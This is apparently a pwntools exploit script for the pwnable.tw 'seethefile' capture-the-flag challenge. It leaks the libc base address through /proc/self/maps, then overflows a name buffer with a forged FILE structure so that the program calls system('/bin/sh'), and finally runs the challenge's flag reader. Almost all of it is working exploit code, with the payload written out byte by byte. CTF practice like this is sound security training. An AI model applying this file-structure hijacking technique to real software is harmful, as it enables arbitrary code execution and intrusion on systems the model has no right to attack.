#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process("./seethefile") 
    elf = ELF("./seethefile.bak")
    libc = io.libc

else:
    io = remote("chall.pwnable.tw", 10200)
    elf = ELF("./seethefile")
    libc = ELF("./libc_32.so.6")

#  elf = ELF("")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def openFile(filename):
    io.sendlineafter(" :", "1")
    io.sendlineafter(" :", filename)

def read():
    io.sendlineafter(" :", "2")

def write():
    io.sendlineafter(" :", "3")

def close():
    io.sendlineafter(" :", "4")

def exit(name):
    io.sendlineafter(" :", "5")
    io.sendlineafter(" :", name)

if __name__ == "__main__":
    success("Step 1: leak libc.address")
    openFile("/proc/self/maps")
    read()
    write()
    read()
    write()
    io.recvline()
    libc.address = int(io.recvuntil("-f7", drop = True), 16)
    success("libc.address -> {:#x}".format(libc.address))
    systemAddr = libc.sym['system']
    pause()
    close()

    success("Step 2: hijack file structure")
    payload = 0x20 * "\x00" + p32(0x804B284) + "/bin/sh\x00" + p32(0)*11 + p32(0x804b260) + p32(3) + p32(0)*3 + p32(0x804b260) + p32(0xffffffff)*2 + p32(0) + p32(0x804b260) + p32(0) * 14 + p32(0x804B31C)
    payload +=  p32(0)*2 + p32(0x804B260)*15 + p32(systemAddr) + p32(0x804b260)*3
    #  payload = cyclic(0x20) + p32(0x804b284) + '\x00' * 0x8c + p32(0x804b31c) + '\x00' * 0x44 + p32(systemAddr)
    exit(payload)

    #  io.interactive()
    io.sendline("/home/seethefile/get_flag")
    io.sendlineafter(" :", "Give me the flag\x00")
    print io.recv()
    io.close()
